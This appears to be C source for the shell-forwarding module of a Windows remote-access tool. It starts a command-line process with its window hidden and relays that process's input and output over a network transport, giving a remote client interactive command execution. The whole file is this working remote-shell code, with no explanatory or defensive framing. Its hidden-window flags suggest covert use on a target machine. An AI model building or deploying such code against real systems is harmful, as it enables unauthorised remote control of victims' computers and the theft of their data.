#include "fwshell.h"

#define BUFFER_SIZE 0x1000

typedef struct
{
    PCTX_TRANSPORT_INFO lpTransportInfo;
    LPCWSTR lpCommandLine;

    HANDLE hInputWrite;

    HANDLE hChildStdIn;
    HANDLE hChildStdOut;
    HANDLE hChildStdErr;

    PROCESS_INFORMATION pi;
    BOOL bRunThread;
} CHILD_INFORMATION, *PCHILD_INFORMATION;


DWORD WINAPI
ShellForwardInput(LPVOID lpvThreadParam)
{
    BYTE lpBuffer[BUFFER_SIZE];
    DWORD dwBytesRead = 0;
    DWORD dwBytesWrote = 0;
    PCHILD_INFORMATION lpChildInfo = (PCHILD_INFORMATION)lpvThreadParam;

    /* Read from the socket and forward it to the running process. */
    while (lpChildInfo->bRunThread)
    {
        dwBytesRead = lpChildInfo->lpTransportInfo->Read(lpChildInfo->lpTransportInfo, lpBuffer, BUFFER_SIZE);
        if (dwBytesRead == 0)
            return 1;
        else
            WriteFile(lpChildInfo->hInputWrite, lpBuffer, dwBytesRead, &dwBytesWrote, NULL);
    }

    return 1;
}

DWORD
ShellExecuteCommand(PCHILD_INFORMATION lpChildInfo)
{
    STARTUPINFO si;

    /* Execute process. */
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&lpChildInfo->pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(si);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;

    si.hStdInput = lpChildInfo->hChildStdIn;
    si.hStdOutput = lpChildInfo->hChildStdOut;
    si.hStdError = lpChildInfo->hChildStdErr;

    if (CreateProcess(NULL,
        lpChildInfo->lpCommandLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &lpChildInfo->pi) == 0)
    {
        return 0;
    }

    return 1;
}


DWORD
ShellExecuteChild(PCTX_TRANSPORT_INFO lpTransportInfo, LPCWSTR lpCommandLine)
{
    DWORD dwRet = 0;
    HANDLE lpObjectArray[2];

    DWORD dwAvailable = 0;

    BYTE lpBuffer[BUFFER_SIZE];

    CHILD_INFORMATION ChildInformation;

    SECURITY_ATTRIBUTES sa;

    HANDLE hOutputRead = INVALID_HANDLE_VALUE;
    HANDLE hOutputWrite = INVALID_HANDLE_VALUE;

    HANDLE hInputRead = INVALID_HANDLE_VALUE;
    HANDLE hInputWrite = INVALID_HANDLE_VALUE;

    HANDLE hThread = INVALID_HANDLE_VALUE;
    DWORD ThreadId = 0;

    DWORD dwRead = 0;

    /* Create pipes to communicate with the executed binary. */
    ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    /* Creating pipes for child's input. */
    if (CreatePipe(&hInputRead, &hInputWrite, &sa, 0) == 0)
        goto cleanup;

    /* Preventing the child from inherinating the handle. */
    if (SetHandleInformation(hInputWrite, HANDLE_FLAG_INHERIT, 0) == FALSE)
        goto cleanup;

    /* Creating the output pipe. */
    if (CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0) == 0)
        goto cleanup;

    /* Preventing the child from inherinating the handle. */
    if (SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0) == FALSE)
        goto cleanup;

    /* Executing the child. */
    ChildInformation.lpCommandLine = lpCommandLine;
    ChildInformation.bRunThread = TRUE;
    ChildInformation.lpTransportInfo = lpTransportInfo;

    ChildInformation.hInputWrite = hInputWrite;

    ChildInformation.hChildStdIn = hInputRead;
    ChildInformation.hChildStdOut = hOutputWrite;
    ChildInformation.hChildStdErr = hOutputWrite;

    if (ShellExecuteCommand(&ChildInformation) == 0)
    {
        printf("[-] Executing command failed.\n");
        goto cleanup;
    }
    lpObjectArray[0] = ChildInformation.pi.hProcess;

    /* Forward input from the communication channel to the new running process. */
    hThread = CreateThread(NULL, 0, ShellForwardInput, (LPVOID)&ChildInformation, 0, &ThreadId);
    if (hThread == NULL)
    {
        printf("[-] CreateThread() failed: %d.\n", GetLastError());
        goto cleanup;
    }
    lpObjectArray[1] = hThread;

    /* Forward output from the new running process to the communication channel. */
    while (1)
    {
        DWORD dwEvent = 0;
        dwEvent = WaitForMultipleObjects(2, lpObjectArray, FALSE, 100);

        switch (dwEvent)
        {
        case WAIT_OBJECT_0 + 0:
            printf("[+] Child exited.\n");
            TerminateThread(hThread, 0);
            goto cleanup;
        case WAIT_OBJECT_0 + 1:
            printf("[+] Connection closed from client.\n");
            goto cleanup;
        }

        /* If nothing is available, we have finished reading output. */
        if (PeekNamedPipe(hOutputRead, NULL, 0, NULL, &dwAvailable, NULL) == FALSE)
            break;

        /* Waiting for data. */
        if (dwAvailable == 0)
            continue;

        /* BUFFER OVERFLOW? */
        if (ReadFile(hOutputRead, &lpBuffer, (BUFFER_SIZE < dwAvailable) ? BUFFER_SIZE : dwAvailable, &dwRead, NULL) != FALSE && dwRead != 0)
        {
            lpTransportInfo->Write(lpTransportInfo, lpBuffer, dwRead);
        }

    }

    dwRet = 1;
cleanup:
    if (hInputRead != INVALID_HANDLE_VALUE)
        CloseHandle(hInputRead);

    if (hInputWrite != INVALID_HANDLE_VALUE)
        CloseHandle(hInputWrite);

    if (hOutputWrite != INVALID_HANDLE_VALUE)
        CloseHandle(hOutputWrite);

    if (hOutputRead != INVALID_HANDLE_VALUE)
        CloseHandle(hOutputRead);

    lpTransportInfo->Disconnect(lpTransportInfo);

    return dwRet;
}